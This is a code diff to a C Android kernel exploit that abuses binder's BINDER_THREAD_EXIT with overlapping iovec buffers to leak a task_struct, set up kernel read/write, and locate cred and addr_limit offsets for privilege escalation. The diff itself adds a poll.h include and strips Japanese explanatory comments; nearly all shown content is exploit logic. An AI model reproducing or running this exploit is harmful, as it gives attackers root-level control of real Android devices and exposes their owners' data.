@@ -18,6 +18,7 @@
 #include <sched.h>
 #include <signal.h>
 #include <pthread.h>
+#include <poll.h>   // ← 追加
 
 #include "binder.h"
 
@@ -125,7 +126,6 @@ int leak_task_struct(void) {
     }
     LOGI("[+] aligned_address=%p", aligned_address);
 
-    // iovec オーバーラップ設定（INDEX=10, 11 が同じバッファを指す）
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
@@ -144,7 +144,6 @@ int leak_task_struct(void) {
     }
 
     if (cpid == 0) {
-        // 子プロセス: 100ms 待機してから BINDER_THREAD_EXIT
         usleep(100000);
         LOGI("[child] BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
@@ -152,7 +151,6 @@ int leak_task_struct(void) {
         _exit(0);
     }
 
-    // 親: readv を呼び出す（ブロックするが、子が BINDER_THREAD_EXIT を呼ぶとデータが来る）
     LOGI("[parent] Calling readv...");
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd bytes", n);
@@ -165,7 +163,6 @@ int leak_task_struct(void) {
         return -1;
     }
 
-    // リークした task_struct を探す
     data = (uint64_t *)aligned_address;
     for (int i = 0; i < (n / 8); i++) {
         uint64_t val = data[i];
@@ -240,8 +237,6 @@ int setup_kernel_rw(void) {
         _exit(0);
     }
 
-    // readv で krw_pipe にデータを読み込む（ブロック）
-    // 代わりに poll で待つ
     struct pollfd pfd;
     pfd.fd = krw_pipe[0];
     pfd.events = POLLIN;
@@ -308,7 +303,6 @@ int scan_task_struct(void) {
         return 0;
     }
 
-    // フォールバック（既知のオフセット）
     LOGI("[!] Using fallback offsets: cred=0x688, addr_limit=0xA18");
     cred_offset = 0x688;
     addr_limit_offset = 0xA18;
